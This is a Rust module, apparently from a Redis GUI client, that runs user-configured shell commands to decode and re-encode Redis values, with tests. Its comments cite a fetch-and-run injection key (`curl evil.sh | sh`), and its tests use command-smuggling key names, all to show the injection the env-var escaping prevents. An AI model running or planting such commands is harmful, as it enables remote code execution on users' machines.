// Copyright 2026 Tree xie.
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
// http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

//! Custom script viewer support.
//!
//! Allows users to process a Redis value through an external shell command and
//! display the stdout as the formatted value.  `shell_command` is a template
//! string executed via `sh -c` (Unix/macOS) or `cmd /c` (Windows) where the
//! following placeholders are substituted before execution:
//!
//! | Placeholder  | Replaced with                                             |
//! |-------------|-------------------------------------------------------------|
//! | `{KEY}`     | The Redis key name, via `$ZEDIS_KEY`                        |
//! | `{VALUE}`   | The raw value as a UTF-8 string (lossy), via `$ZEDIS_VALUE` |
//! | `{HEX}`     | Lower-hex encoding of the raw bytes                         |
//! | `{HEX_FILE}`| Path to a temp file containing the hex-encoded bytes        |
//! | `{RAW_FILE}`| Path to a temp file containing the raw bytes (binary-safe)  |
//!
//! `{RAW_FILE}` is the recommended way to feed binary data to a command without
//! relying on `echo` or shell quoting.  Shell pipes and redirections work
//! naturally because the command runs through the shell interpreter.
//!
//! ## Key and value never touch the command line
//!
//! A viewer fires on a key-pattern match, so opening a key is enough to run it —
//! and both the key name and the value are chosen by whoever can write to that
//! Redis. Substituting them into the command string would make
//! `k"; curl evil.sh | sh; #` a working key name. `{KEY}` and `{VALUE}` are
//! therefore replaced by a *reference* to an environment variable —
//! `"$ZEDIS_KEY"` under `sh`, `!ZEDIS_KEY!` under `cmd /v:on` — which the shell
//! resolves only after it has finished parsing the line, so nothing in the data
//! can be read as syntax. Templates keep working unchanged, including the ones
//! that quoted the placeholder themselves (`'{VALUE}'`). The variables are
//! exported only when the template mentions them; a value over ~128 KiB exceeds
//! what the OS accepts per variable, so large payloads belong in `{RAW_FILE}`.
//! The one behavioural cost is on Windows, where `/v:on` gives a literal `!` in
//! a template its delayed-expansion meaning — write it as `^!`.
//!
//! Every run is bounded: [`SCRIPT_TIMEOUT`] kills a command that hangs (it runs
//! inside the key-load task) and [`MAX_SCRIPT_OUTPUT`] caps what is buffered
//! from a command that never stops writing.
//!
//! ```text
//! base64 --decode {RAW_FILE}           # binary-safe, no echo needed
//! base64 --decode < {RAW_FILE}         # redirect as stdin
//! cat {HEX_FILE} | xxd -r -p | jq .   # hex → binary → JSON
//! jq -r .name {RAW_FILE}               # parse JSON value directly
//! ```
//!
//! ## Bidirectional viewers (`encode_command` write-back)
//!
//! By default, a script viewer's output is a read-only preview — the same
//! contract every native decoder (MessagePack, gzip, Protobuf) follows, with
//! edits going through the hex view. Many custom decoders are lossy
//! (`jq -r .name`), so write-back is strictly opt-in per viewer:
//!
//! 1. [`ScriptConfig::encode_command`] (optional, `#[serde(default)]` so stored
//!    rows upgrade cleanly) holds the inverse shell command template. When set,
//!    [`ScriptManager::execute_encode`] / [`ScriptManager::encode_for_key`] runs
//!    [`run_script_bytes`] with the edited text as `{VALUE}` / `{RAW_FILE}` and
//!    captures raw stdout bytes for `SET`;
//! 2. the value editor lifts its read-only rule for a `Script` value whose
//!    viewer has a non-empty `encode_command` ([`ScriptConfig::has_encoder`]),
//!    and runs the encoder before `SET` — any non-zero exit or timeout surfaces
//!    as an error toast and aborts the write;
//! 3. [`ScriptManager::export_all`] exports all configured script viewers in a
//!    deterministic order for team JSON sharing.

use super::{SCRIPT_VIEWER_TABLE, get_database};
use crate::error::Error;
use dashmap::DashMap;
use redb::{ReadableDatabase, ReadableTable};
use serde::{Deserialize, Serialize};
use std::borrow::Cow;
use std::io::{Read, Write};
use std::process::{Child, Command, ExitStatus, Stdio};
use std::sync::LazyLock;
use std::sync::mpsc;
use std::thread;
use std::time::{Duration, Instant};
use tempfile::NamedTempFile;
use tracing::{info, warn};

pub use super::protos::MatchMode;

type Result<T, E = Error> = std::result::Result<T, E>;

/// HEX strings longer than this are written to a temp file instead of inlined.
const HEX_INLINE_MAX: usize = 8000;

/// How long a viewer script may run before it is killed. It runs inside the
/// key-load task, so a command that never returns would otherwise leave that
/// key loading forever.
const SCRIPT_TIMEOUT: Duration = Duration::from_secs(5);

/// Ceiling on the stdout kept for display. The output replaces one value in the
/// editor, so there is nothing to gain from buffering more than this.
const MAX_SCRIPT_OUTPUT: usize = 4 * 1024 * 1024;

/// Ceiling on stderr, which only ever ends up inside an error message.
const MAX_SCRIPT_STDERR: usize = 64 * 1024;

/// How long to wait for the drain threads after the process is gone.
const DRAIN_GRACE: Duration = Duration::from_secs(2);

/// How often [`wait_with_timeout`] re-checks a running child. Short enough not
/// to add noticeable latency to the common case (a script that finishes in
/// milliseconds), long enough not to spin.
const POLL_INTERVAL: Duration = Duration::from_millis(2);

/// Environment variables that carry `{KEY}` / `{VALUE}` to the script out of
/// band, instead of through the command line.
const KEY_ENV: &str = "ZEDIS_KEY";
const VALUE_ENV: &str = "ZEDIS_VALUE";

static SCRIPT_CACHE: LazyLock<DashMap<String, ScriptConfig>> = LazyLock::new(DashMap::new);

/// One saved script viewer.
///
/// `#[serde(default)]` is the upgrade contract (see [`crate::ProtoConfig`]): a
/// row written before a field existed must still load, because [`init`] skips
/// what it cannot read.
///
/// [`init`]: ScriptManager::init
#[derive(Debug, Clone, Default, PartialEq, Serialize, Deserialize)]
#[serde(default)]
pub struct ScriptConfig {
    pub server_id: String,
    pub name: String,
    /// Full shell command template executed via `sh -c` (Unix) or `cmd /c` (Windows).
    /// Supports placeholders: `{KEY}`, `{VALUE}`, `{HEX}`, `{HEX_FILE}`, `{RAW_FILE}`.
    /// Shell features (pipes, redirects, etc.) work naturally — but `{KEY}` and
    /// `{VALUE}` expand out of band (see the module docs), so server-controlled
    /// text can never become part of the command.
    pub shell_command: String,
    /// Optional inverse shell command template executed when saving an edited
    /// decoded value back to Redis. Receives the edited text via `{VALUE}` /
    /// `{RAW_FILE}` and writes the raw bytes to stdout. Empty means decode-only
    /// (read-only in the text editor).
    pub encode_command: String,
    pub match_pattern: String,
    pub mode: MatchMode,
}

impl ScriptConfig {
    /// Returns `true` when this viewer has an `encode_command` configured for
    /// bidirectional editing.
    pub fn has_encoder(&self) -> bool {
        !self.encode_command.trim().is_empty()
    }
}

pub struct ScriptManager;

impl ScriptManager {
    pub fn init() -> Result<()> {
        let db = get_database()?;
        let read_txn = db.begin_read()?;
        let table = read_txn.open_table(SCRIPT_VIEWER_TABLE)?;

        let mut skipped = 0usize;
        for item in table.iter()? {
            let (key, value) = item?;
            let id = key.value();
            // Skipped, not deleted: a row this build cannot read is still the
            // user's viewer definition. Removing it used to make a field added
            // in a later release silently wipe every saved viewer on first run.
            let config: ScriptConfig = match serde_json::from_slice(value.value()) {
                Ok(c) => c,
                Err(e) => {
                    warn!(id, error = %e, "unreadable script entry, skipped");
                    skipped += 1;
                    continue;
                }
            };
            // With `#[serde(default)]` a truncated row parses into empty
            // strings rather than failing, so hold it to the bar `upsert`
            // enforces — an empty command is not a viewer, and it would run
            // against every key a default (prefix) pattern matches.
            if config.name.is_empty() || config.shell_command.is_empty() {
                warn!(id, "incomplete script entry, skipped");
                skipped += 1;
                continue;
            }
            info!(id, name = config.name, server_id = config.server_id, "load script");
            SCRIPT_CACHE.insert(id.to_string(), config);
        }
        drop(read_txn);

        info!(count = SCRIPT_CACHE.len(), skipped, "load scripts success");
        Ok(())
    }

    pub fn list_with_id() -> Vec<(String, ScriptConfig)> {
        SCRIPT_CACHE
            .iter()
            .map(|item| (item.key().clone(), item.value().clone()))
            .collect()
    }

    /// Exports all saved script viewer configurations sorted deterministically
    /// by `(name, server_id, match_pattern)` for JSON sharing.
    pub fn export_all() -> Vec<ScriptConfig> {
        let mut items: Vec<ScriptConfig> = SCRIPT_CACHE.iter().map(|entry| entry.value().clone()).collect();
        items.sort_by(|a, b| (&a.name, &a.server_id, &a.match_pattern).cmp(&(&b.name, &b.server_id, &b.match_pattern)));
        items
    }

    pub fn get(id: &str) -> Result<ScriptConfig> {
        let db = get_database()?;
        let read_txn = db.begin_read()?;
        let table = read_txn.open_table(SCRIPT_VIEWER_TABLE)?;
        let Some(v) = table.get(id)? else {
            return Err(Error::Invalid {
                message: "script viewer not found".to_string(),
            });
        };
        Ok(serde_json::from_slice(v.value())?)
    }

    pub fn upsert(id: &str, config: ScriptConfig) -> Result<()> {
        if config.name.is_empty() {
            return Err(Error::Invalid {
                message: "script viewer name is empty".to_string(),
            });
        }
        if config.shell_command.is_empty() {
            return Err(Error::Invalid {
                message: "script viewer shell command is empty".to_string(),
            });
        }
        let db = get_database()?;
        let write_txn = db.begin_write()?;
        {
            let mut table = write_txn.open_table(SCRIPT_VIEWER_TABLE)?;
            let json = serde_json::to_string(&config)?;
            table.insert(id, json.as_bytes())?;
        }
        write_txn.commit()?;
        SCRIPT_CACHE.insert(id.to_string(), config);
        Ok(())
    }

    pub fn delete(id: &str) -> Result<()> {
        let db = get_database()?;
        let write_txn = db.begin_write()?;
        {
            let mut table = write_txn.open_table(SCRIPT_VIEWER_TABLE)?;
            table.remove(id)?;
        }
        write_txn.commit()?;
        SCRIPT_CACHE.remove(id);
        Ok(())
    }

    /// Returns the script ID whose pattern matches `key` for `server_id`.
    pub fn match_key_to_id(server_id: &str, key: &str) -> Option<String> {
        let item = SCRIPT_CACHE
            .iter()
            .find(|item| item.server_id == server_id && item.mode.matches(&item.match_pattern, key))?;
        Some(item.key().clone())
    }

    /// Returns `true` when the script viewer matching `(server_id, key)` has a
    /// non-empty `encode_command` configured.
    pub fn has_encoder_for_key(server_id: &str, key: &str) -> bool {
        let Some(id) = Self::match_key_to_id(server_id, key) else {
            return false;
        };
        SCRIPT_CACHE
            .get(&id)
            .map(|c| c.has_encoder())
            .or_else(|| Self::get(&id).ok().map(|c| c.has_encoder()))
            .unwrap_or(false)
    }

    /// Executes the shell command for the given script ID with `data` as input.
    ///
    /// Substitutes template placeholders in `shell_command`, then runs it via
    /// `sh -c` (Unix) / `cmd /c` (Windows) and returns the captured stdout.
    pub fn execute(id: &str, key: &str, data: &[u8]) -> Result<String> {
        let config = {
            if let Some(c) = SCRIPT_CACHE.get(id) {
                c.clone()
            } else {
                Self::get(id)?
            }
        };

        run_script(&config.shell_command, key, data, SCRIPT_TIMEOUT, MAX_SCRIPT_OUTPUT)
    }

    /// Executes the `encode_command` for the given script ID with `edited_text`
    /// as input (`{VALUE}` / `{RAW_FILE}`) and returns the raw stdout bytes.
    ///
    /// Fails if `encode_command` is empty, exits non-zero, or times out.
    pub fn execute_encode(id: &str, key: &str, edited_text: &str) -> Result<Vec<u8>> {
        let config = if let Some(c) = SCRIPT_CACHE.get(id) {
            c.clone()
        } else {
            Self::get(id)?
        };
        if !config.has_encoder() {
            return Err(Error::Invalid {
                message: "script viewer has no encode command".to_string(),
            });
        }

        run_script_bytes(
            &config.encode_command,
            key,
            edited_text.as_bytes(),
            SCRIPT_TIMEOUT,
            MAX_SCRIPT_OUTPUT,
        )
    }

    /// Finds the script viewer matching `(server_id, key)` and runs its
    /// `encode_command` against `edited_text`, returning the raw stdout bytes.
    pub fn encode_for_key(server_id: &str, key: &str, edited_text: &str) -> Result<Vec<u8>> {
        let id = Self::match_key_to_id(server_id, key).ok_or_else(|| Error::Invalid {
            message: "no matching script viewer for key".to_string(),
        })?;
        Self::execute_encode(&id, key, edited_text)
    }
}

/// Runs one viewer template against `key` / `data` and returns its UTF-8 stdout.
///
/// Split out of [`ScriptManager::execute`] so the limits are injectable: the
/// tests drive the timeout and the output cap without sleeping for seconds or
/// buffering megabytes.
fn run_script(tmpl: &str, key: &str, data: &[u8], timeout: Duration, max_output: usize) -> Result<String> {
    let stdout = run_script_bytes(tmpl, key, data, timeout, max_output)?;
    Ok(String::from_utf8_lossy(&stdout).into_owned())
}

/// Runs one viewer or encoder template against `key` / `data` and returns its
/// raw stdout bytes.
fn run_script_bytes(tmpl: &str, key: &str, data: &[u8], timeout: Duration, max_output: usize) -> Result<Vec<u8>> {
    let hex = bytes_to_hex(data);
    let value_str = String::from_utf8_lossy(data);

    // {RAW_FILE}: temp file with the raw bytes — binary-safe, no echo needed.
    let raw_file: Option<NamedTempFile> = if tmpl.contains("{RAW_FILE}") {
        let mut f = NamedTempFile::new().map_err(|e| Error::Invalid {
            message: format!("failed to create raw temp file: {e}"),
        })?;
        f.write_all(data).map_err(|e| Error::Invalid {
            message: format!("failed to write raw temp file: {e}"),
        })?;
        Some(f)
    } else {
        None
    };

    // {HEX_FILE}: temp file with hex-encoded bytes.
    // Also used when {HEX} is present but the hex string is too long to inline.
    let hex_file: Option<NamedTempFile> =
        if tmpl.contains("{HEX_FILE}") || (tmpl.contains("{HEX}") && hex.len() > HEX_INLINE_MAX) {
            let mut f = NamedTempFile::new().map_err(|e| Error::Invalid {
                message: format!("failed to create hex temp file: {e}"),
            })?;
            f.write_all(hex.as_bytes()).map_err(|e| Error::Invalid {
                message: format!("failed to write hex temp file: {e}"),
            })?;
            Some(f)
        } else {
            None
        };

    // Placeholders whose replacement *we* generate — a temp-file path we just
    // created, or lower-hex — carry no shell syntax, so they are substituted
    // inline as before.
    let mut cmd_str = tmpl.to_string();
    if let Some(ref f) = raw_file {
        cmd_str = cmd_str.replace("{RAW_FILE}", &f.path().to_string_lossy());
    } else {
        cmd_str = cmd_str.replace("{RAW_FILE}", "");
    }
    if let Some(ref f) = hex_file {
        let path = f.path().to_string_lossy();
        cmd_str = cmd_str.replace("{HEX_FILE}", path.as_ref());
        if hex.len() > HEX_INLINE_MAX {
            cmd_str = cmd_str.replace("{HEX}", path.as_ref());
        } else {
            cmd_str = cmd_str.replace("{HEX}", &hex);
        }
    } else {
        cmd_str = cmd_str.replace("{HEX}", &hex);
        cmd_str = cmd_str.replace("{HEX_FILE}", "");
    }

    // {KEY} / {VALUE} are the two placeholders whose content comes off the
    // server, so they are never pasted into the command line — see
    // [`substitute_via_env`].
    cmd_str = substitute_via_env(&cmd_str, "{KEY}", KEY_ENV);
    cmd_str = substitute_via_env(&cmd_str, "{VALUE}", VALUE_ENV);

    let mut command = shell_command(&cmd_str);
    // Only export what the template asked for: a value is unbounded, and every
    // exported byte counts against the per-variable limit the OS enforces at
    // spawn time (128 KiB on Linux). A template that never mentions {VALUE}
    // must not start failing on a large key.
    let key_env = without_nul(key);
    let value_env = without_nul(value_str.as_ref());
    if tmpl.contains("{KEY}") {
        command.env(KEY_ENV, &*key_env);
    }
    if tmpl.contains("{VALUE}") {
        command.env(VALUE_ENV, &*value_env);
    }
    command
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());

    let mut child = command.spawn().map_err(|e| Error::Invalid {
        message: format!("failed to run shell command: {e}"),
    })?;

    // Drain both pipes from their own threads: a script that writes more than
    // the pipe buffer would otherwise block forever while we wait on it.
    let (out_tx, out_rx) = mpsc::channel();
    let (err_tx, err_rx) = mpsc::channel();
    let stdout = child.stdout.take();
    let stderr = child.stderr.take();
    thread::spawn(move || {
        let _ = out_tx.send(read_capped(stdout, max_output));
    });
    thread::spawn(move || {
        let _ = err_tx.send(read_capped(stderr, MAX_SCRIPT_STDERR));
    });

    let Some(status) = wait_with_timeout(&mut child, timeout)? else {
        // The threads above are left to finish on their own: killing the shell
        // closes the pipes, but a grandchild it spawned may still hold them.
        return Err(Error::Invalid {
            message: format!("script timed out after {}ms", timeout.as_millis()),
        });
    };

    // The process is gone, so both pipes are at EOF unless something it spawned
    // inherited them — bounded so that case can't hang a key load either.
    let (stdout, truncated) = out_rx.recv_timeout(DRAIN_GRACE).map_err(|_| Error::Invalid {
        message: "script exited but left stdout open".to_string(),
    })?;

    if !status.success() {
        let (stderr, _) = err_rx.recv_timeout(DRAIN_GRACE).unwrap_or_default();
        let stderr = String::from_utf8_lossy(&stderr);
        return Err(Error::Invalid {
            message: format!("script exited with error: {}", stderr.trim()),
        });
    }
    if truncated {
        warn!(max_output, "script viewer output truncated");
    }

    Ok(stdout)
}

/// The shell that runs a template, configured so that the environment variables
/// below expand *after* the command line has been parsed.
fn shell_command(cmd_str: &str) -> Command {
    #[cfg(target_os = "windows")]
    {
        let mut c = Command::new("cmd");
        // `/v:on` turns on delayed expansion, which is what makes `!VAR!`
        // resolve after parsing. Plain `%VAR%` is substituted *before*, i.e.
        // exactly the injection this indirection exists to prevent.
        c.args(["/v:on", "/c", cmd_str]);
        c
    }
    #[cfg(not(target_os = "windows"))]
    {
        let mut c = Command::new("sh");
        c.args(["-c", cmd_str]);
        c
    }
}

/// Replace every `placeholder` with a *reference* to `env_var` rather than with
/// the data itself.
///
/// `{KEY}` and `{VALUE}` hold text that comes straight off the Redis server —
/// and a key name is something anyone with write access to that server picks.
/// Pasting it into the command line makes `k"; curl evil.sh | sh; #` run as
/// soon as the key is opened, because a viewer fires on a key-pattern match, not
/// on a click. Emitting `"$ZEDIS_KEY"` (`!ZEDIS_KEY!` under `cmd /v:on`) instead
/// means the shell has already finished parsing by the time the value appears,
/// so no byte of it can ever be read as syntax.
///
/// A template that quoted the placeholder itself (`'{KEY}'`, `"{KEY}"`) has that
/// pair consumed: the emitted reference is quoted already, and nesting it inside
/// single quotes would stop the expansion. A placeholder embedded in a longer
/// quoted word (`"prefix{KEY}"`) still expands, but unquoted — safe, though a
/// value with spaces will word-split; `{RAW_FILE}` is the placeholder for that.
fn substitute_via_env(tmpl: &str, placeholder: &str, env_var: &str) -> String {
    #[cfg(target_os = "windows")]
    let reference = format!("!{env_var}!");
    #[cfg(not(target_os = "windows"))]
    let reference = format!("\"${env_var}\"");

    let mut out = String::with_capacity(tmpl.len());
    let mut rest = tmpl;
    while let Some(at) = rest.find(placeholder) {
        let (before, tail) = rest.split_at(at);
        let after = &tail[placeholder.len()..];
        let wrapping_quote = before
            .chars()
            .next_back()
            .filter(|c| (*c == '"' || *c == '\'') && after.starts_with(*c));
        match wrapping_quote {
            Some(q) => {
                out.push_str(&before[..before.len() - q.len_utf8()]);
                out.push_str(&reference);
                rest = &after[q.len_utf8()..];
            }
            None => {
                out.push_str(before);
                out.push_str(&reference);
                rest = after;
            }
        }
    }
    out.push_str(rest);
    out
}

/// An environment variable cannot contain a NUL, and handing one to `spawn`
/// fails the whole call. Binary values belong in `{RAW_FILE}`; this only keeps
/// a stray NUL from taking the viewer down with it.
fn without_nul(s: &str) -> Cow<'_, str> {
    if s.contains('\0') {
        Cow::Owned(s.replace('\0', ""))
    } else {
        Cow::Borrowed(s)
    }
}

/// Wait for `child`, killing it once `timeout` has passed. `Ok(None)` is the
/// timeout — the caller turns it into an error after deciding what to do with
/// the pipes.
fn wait_with_timeout(child: &mut Child, timeout: Duration) -> Result<Option<ExitStatus>> {
    let deadline = Instant::now() + timeout;
    loop {
        match child.try_wait() {
            Ok(Some(status)) => return Ok(Some(status)),
            Ok(None) => {
                if Instant::now() >= deadline {
                    let _ = child.kill();
                    let _ = child.wait();
                    return Ok(None);
                }
                thread::sleep(POLL_INTERVAL);
            }
            Err(e) => {
                let _ = child.kill();
                return Err(Error::Invalid {
                    message: format!("failed to wait for shell command: {e}"),
                });
            }
        }
    }
}

/// Read `reader` to EOF, keeping at most `cap` bytes. Everything past the cap is
/// read and dropped rather than left in the pipe, so the child can still reach
/// its own exit instead of blocking on a full buffer.
fn read_capped<R: Read>(reader: Option<R>, cap: usize) -> (Vec<u8>, bool) {
    let Some(mut reader) = reader else {
        return (Vec::new(), false);
    };
    let mut kept = Vec::new();
    let mut chunk = [0u8; 8192];
    let mut truncated = false;
    loop {
        match reader.read(&mut chunk) {
            Ok(0) | Err(_) => break,
            Ok(n) => {
                let room = cap.saturating_sub(kept.len());
                if room == 0 {
                    truncated = true;
                    continue;
                }
                kept.extend_from_slice(&chunk[..n.min(room)]);
                truncated |= n > room;
            }
        }
    }
    (kept, truncated)
}

fn bytes_to_hex(data: &[u8]) -> String {
    data.iter().fold(String::with_capacity(data.len() * 2), |mut s, b| {
        use std::fmt::Write;
        let _ = write!(s, "{:02x}", b);
        s
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    /// The reference the current platform's shell resolves after parsing.
    fn reference(var: &str) -> String {
        if cfg!(target_os = "windows") {
            format!("!{var}!")
        } else {
            format!("\"${var}\"")
        }
    }

    #[test]
    fn substitutes_a_bare_placeholder_with_an_env_reference() {
        assert_eq!(
            substitute_via_env("printf %s {KEY}", "{KEY}", KEY_ENV),
            format!("printf %s {}", reference(KEY_ENV))
        );
    }

    #[test]
    fn consumes_quotes_the_template_put_around_the_placeholder() {
        // Both forms are what a user writes once they notice values contain
        // spaces; nesting our own quoted reference inside them would either
        // stop the expansion (single) or leave stray quotes in the data.
        for tmpl in ["echo \"{VALUE}\"", "echo '{VALUE}'"] {
            assert_eq!(
                substitute_via_env(tmpl, "{VALUE}", VALUE_ENV),
                format!("echo {}", reference(VALUE_ENV))
            );
        }
    }

    #[test]
    fn substitutes_every_occurrence() {
        let r = reference(KEY_ENV);
        assert_eq!(
            substitute_via_env("a {KEY} b '{KEY}' c", "{KEY}", KEY_ENV),
            format!("a {r} b {r} c")
        );
    }

    #[test]
    fn leaves_a_template_without_the_placeholder_alone() {
        let tmpl = "xxd {RAW_FILE}";
        assert_eq!(substitute_via_env(tmpl, "{KEY}", KEY_ENV), tmpl);
    }

    #[test]
    fn strips_nul_bytes_but_keeps_the_rest_borrowed() {
        assert!(matches!(without_nul("plain"), Cow::Borrowed("plain")));
        assert_eq!(without_nul("a\0b").as_ref(), "ab");
    }

    #[test]
    fn caps_what_it_keeps_and_reports_the_truncation() {
        let (kept, truncated) = read_capped(Some(&b"0123456789"[..]), 4);
        assert_eq!(kept, b"0123");
        assert!(truncated);

        let (kept, truncated) = read_capped(Some(&b"0123"[..]), 4);
        assert_eq!(kept, b"0123");
        assert!(!truncated);
    }

    /// The tests below actually spawn the platform shell. They are written
    /// against `sh`; the Windows path uses the same indirection but a different
    /// syntax, and CI has no shell-level coverage there.
    #[cfg(not(target_os = "windows"))]
    mod shell {
        use super::*;

        const CAP: usize = 1 << 20;
        const TIMEOUT: Duration = Duration::from_secs(10);

        fn run(tmpl: &str, key: &str, data: &[u8]) -> Result<String> {
            run_script(tmpl, key, data, TIMEOUT, CAP)
        }

        #[test]
        fn a_key_name_is_data_even_when_it_is_shell_syntax() {
            // The injection this whole indirection exists for: a viewer matches
            // `k*`, so opening the key is what runs the command. Before the
            // env-var substitution the first of these printed "OWNED" and the
            // second was a shell syntax error.
            for key in ["k; echo OWNED; #", "k\"; echo OWNED; #", "k$(echo OWNED)"] {
                let out = run("printf %s {KEY}", key, b"").expect("script runs");
                assert_eq!(out, key);
            }
        }

        #[test]
        fn a_value_is_data_even_when_it_is_shell_syntax() {
            let value = "$(echo OWNED) `echo OWNED` | echo OWNED";
            let out = run("printf %s {VALUE}", "k", value.as_bytes()).expect("script runs");
            assert_eq!(out, value);
        }

        #[test]
        fn a_template_that_quoted_the_placeholder_still_gets_the_whole_value() {
            let value = "two words; and a semicolon";
            for tmpl in ["printf %s \"{VALUE}\"", "printf %s '{VALUE}'"] {
                let out = run(tmpl, "k", value.as_bytes()).expect("script runs");
                assert_eq!(out, value);
            }
        }

        #[test]
        fn exports_nothing_the_template_did_not_ask_for() {
            let out = run("printf %s \"${ZEDIS_VALUE:-unset}\"", "k", b"secret").expect("script runs");
            assert_eq!(out, "unset");
        }

        #[test]
        fn still_feeds_raw_bytes_through_the_temp_file() {
            let out = run("cat {RAW_FILE}", "k", &[0x00, 0x41, 0x42]).expect("script runs");
            assert_eq!(out.as_bytes(), &[0x00, 0x41, 0x42]);
        }

        #[test]
        fn a_hung_script_is_killed_instead_of_stalling_the_key_load() {
            let started = Instant::now();
            let err = run_script("sleep 30", "k", b"", Duration::from_millis(200), CAP)
                .expect_err("a script that never returns must fail");
            assert!(err.to_string().contains("timed out"), "{err}");
            assert!(
                started.elapsed() < Duration::from_secs(5),
                "kill took {:?}",
                started.elapsed()
            );
        }

        #[test]
        fn output_beyond_the_cap_is_dropped_rather_than_buffered() {
            // Writes far more than the cap and must still exit on its own:
            // the drain keeps reading past the cap so the pipe never fills.
            let out = run_script("yes 0123456789 | head -c 200000", "k", b"", TIMEOUT, 16).expect("script runs");
            assert_eq!(out.len(), 16);
        }

        #[test]
        fn a_failing_script_reports_its_stderr() {
            let err = run("echo boom >&2; exit 3", "k", b"").expect_err("non-zero exit is an error");
            assert!(err.to_string().contains("boom"), "{err}");
        }
    }

    /// The stored side of the viewer: what redb keeps, and what survives a
    /// release that changes the record.
    mod manager {
        use super::*;
        use crate::init_database_for_tests;
        use zedis_core::fs::override_config_dir;

        fn setup() {
            override_config_dir(std::env::temp_dir().join(format!("zedis-test-config-{}", std::process::id())));
            init_database_for_tests();
        }

        fn config(server_id: &str, pattern: &str, mode: MatchMode) -> ScriptConfig {
            ScriptConfig {
                server_id: server_id.to_string(),
                name: "viewer".to_string(),
                shell_command: "cat {RAW_FILE}".to_string(),
                encode_command: String::new(),
                match_pattern: pattern.to_string(),
                mode,
            }
        }

        fn write_raw(id: &str, json: &[u8]) {
            let db = get_database().expect("database");
            let txn = db.begin_write().expect("begin write");
            {
                let mut table = txn.open_table(SCRIPT_VIEWER_TABLE).expect("open");
                table.insert(id, json).expect("insert");
            }
            txn.commit().expect("commit");
        }

        fn raw_exists(id: &str) -> bool {
            let db = get_database().expect("database");
            let txn = db.begin_read().expect("begin read");
            let table = txn.open_table(SCRIPT_VIEWER_TABLE).expect("open");
            table.get(id).expect("get").is_some()
        }

        #[test]
        fn a_viewer_saved_by_an_older_build_still_loads() {
            // The shape before `mode` existed. Without the upgrade contract this
            // failed to parse — and the loader used to answer that by deleting
            // the row, i.e. every saved viewer vanished on first launch after a
            // release that touched this struct.
            let legacy =
                br#"{"server_id":"s1","name":"json","shell_command":"jq . {RAW_FILE}","match_pattern":"user:"}"#;
            let parsed: ScriptConfig = serde_json::from_slice(legacy).expect("legacy row parses");
            assert_eq!(parsed.match_pattern, "user:");
            assert_eq!(parsed.mode, MatchMode::Prefix, "a missing mode falls back to prefix");
        }

        #[test]
        fn upsert_get_and_delete_round_trip() {
            setup();
            ScriptManager::upsert("sc-rt", config("sc-rt-srv", "user:", MatchMode::Prefix)).expect("upsert");

            let got = ScriptManager::get("sc-rt").expect("get");
            assert_eq!(got.shell_command, "cat {RAW_FILE}");
            assert!(ScriptManager::list_with_id().iter().any(|(id, _)| id == "sc-rt"));

            ScriptManager::delete("sc-rt").expect("delete");
            assert!(ScriptManager::get("sc-rt").is_err());
            assert!(!raw_exists("sc-rt"));
            assert!(ScriptManager::match_key_to_id("sc-rt-srv", "user:1").is_none());
        }

        #[test]
        fn refuses_a_viewer_with_no_command() {
            setup();
            let mut empty_cmd = config("sc-bad-srv", "k", MatchMode::Prefix);
            empty_cmd.shell_command = String::new();
            assert!(ScriptManager::upsert("sc-bad", empty_cmd).is_err());

            let mut empty_name = config("sc-bad-srv", "k", MatchMode::Prefix);
            empty_name.name = String::new();
            assert!(ScriptManager::upsert("sc-bad", empty_name).is_err());
            assert!(!raw_exists("sc-bad"));
        }

        #[test]
        fn matches_a_key_by_every_mode_and_only_for_its_own_server() {
            setup();
            ScriptManager::upsert("sc-pre", config("sc-m-srv", "user:", MatchMode::Prefix)).expect("upsert");
            ScriptManager::upsert("sc-suf", config("sc-m-srv", ":raw", MatchMode::Suffix)).expect("upsert");
            ScriptManager::upsert("sc-exa", config("sc-m-srv", "exactly", MatchMode::Exact)).expect("upsert");
            ScriptManager::upsert("sc-re", config("sc-m-srv", "^ev[0-9]+$", MatchMode::Regex)).expect("upsert");

            assert_eq!(
                ScriptManager::match_key_to_id("sc-m-srv", "user:1").as_deref(),
                Some("sc-pre")
            );
            assert_eq!(
                ScriptManager::match_key_to_id("sc-m-srv", "blob:raw").as_deref(),
                Some("sc-suf")
            );
            assert_eq!(
                ScriptManager::match_key_to_id("sc-m-srv", "exactly").as_deref(),
                Some("sc-exa")
            );
            assert_eq!(
                ScriptManager::match_key_to_id("sc-m-srv", "ev42").as_deref(),
                Some("sc-re")
            );
            assert!(ScriptManager::match_key_to_id("sc-m-srv", "nothing").is_none());
            // A viewer belongs to the server it was configured on.
            assert!(ScriptManager::match_key_to_id("sc-other-srv", "user:1").is_none());
        }

        #[test]
        fn an_invalid_regex_matches_nothing_instead_of_failing() {
            setup();
            ScriptManager::upsert("sc-badre", config("sc-badre-srv", "[unclosed", MatchMode::Regex)).expect("upsert");
            assert!(ScriptManager::match_key_to_id("sc-badre-srv", "anything").is_none());
        }

        #[test]
        fn init_skips_what_it_cannot_read_and_keeps_it_on_disk() {
            setup();
            write_raw("sc-init-broken", b"not json at all");
            ScriptManager::upsert("sc-init-good", config("sc-init-srv", "keep:", MatchMode::Prefix)).expect("upsert");
            SCRIPT_CACHE.remove("sc-init-good");

            ScriptManager::init().expect("init");

            assert!(SCRIPT_CACHE.contains_key("sc-init-good"));
            assert!(!SCRIPT_CACHE.contains_key("sc-init-broken"));
            assert!(raw_exists("sc-init-broken"), "an unreadable row is never deleted");
        }

        #[test]
        fn init_skips_a_row_that_would_run_an_empty_command_on_every_key() {
            setup();
            // `#[serde(default)]` makes this parse now: no command, and an empty
            // prefix pattern that `match_key_to_id` would answer for any key.
            write_raw("sc-init-empty", br#"{"server_id":"sc-empty-srv","name":"ghost"}"#);
            ScriptManager::init().expect("init");
            assert!(!SCRIPT_CACHE.contains_key("sc-init-empty"));
            assert!(ScriptManager::match_key_to_id("sc-empty-srv", "any:key").is_none());
        }

        #[test]
        #[cfg(not(target_os = "windows"))]
        fn bidirectional_encode_and_decode_round_trip() {
            setup();
            let mut cfg = config("sc-bi-srv", "enc:", MatchMode::Prefix);
